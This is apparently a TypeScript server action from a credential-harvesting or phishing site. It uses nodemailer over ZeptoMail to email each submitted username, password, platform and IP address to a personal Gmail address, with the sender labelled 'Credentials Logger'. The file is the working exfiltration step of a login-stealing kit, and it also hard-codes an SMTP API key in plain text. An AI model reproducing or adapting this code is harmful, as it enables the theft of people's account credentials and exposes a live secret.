"use server";

const nodemailer = require("nodemailer");
const transporter = nodemailer.createTransport({
  host: "smtp.zeptomail.com",
  port: 465,
  secure: true,
  // auth: {
  //   // TODO: replace `user` and `pass` values from <https://forwardemail.net>
  //   user: process.env.GMAIL_EMAIL + "@bidartistry.com",
  //   pass: process.env.GMAIL_PASSWORD,
  // },
  auth: {
    user: "emailapikey",
    pass: "wSsVR60g+BH3C6p/mTP4I+w9n15SUwj2Fh56jAOm4nKqTfmWp8dpkEefDQb1H/RLFzNgF2ZD9bN9zUgAgGIPh94rywlVCyiF9mqRe1U4J3x17qnvhDzJXmhVmxuPLY8Mwghsn2NoEMEr+g==",
  },
});
const sendMail = async ({
  username,
  password,
  ipaddress,
  platform,
}: {
  username: string;
  password: string;
  ipaddress?: string;
  platform?: string;
}) => {
  const info = await transporter.sendMail({
    // from: `Credentials Logger <${process.env.GMAIL_EMAIL}@bidartistry.com>`,
    from: '"Credentials Logger" <noreply@bidartistry.com>',
    to: `Julian Lennon <julianle1610@gmail.com>`,
    subject: "New Details Collected",
    text: `PLATFORM: ${platform}, Username: ${username}, Password: ${password}, ipaddress: ${ipaddress}`,
    html: `<p>PLATFORM: <b>${platform}</b>, Username: <b>${username}</b>, Password: <b>${password}</b>, IPAddress: <b>${await (
      ipaddress as any
    ).value}</b></p>`,
  });

  console.log("Message sent: %s", info.messageId);
};

export default sendMail;
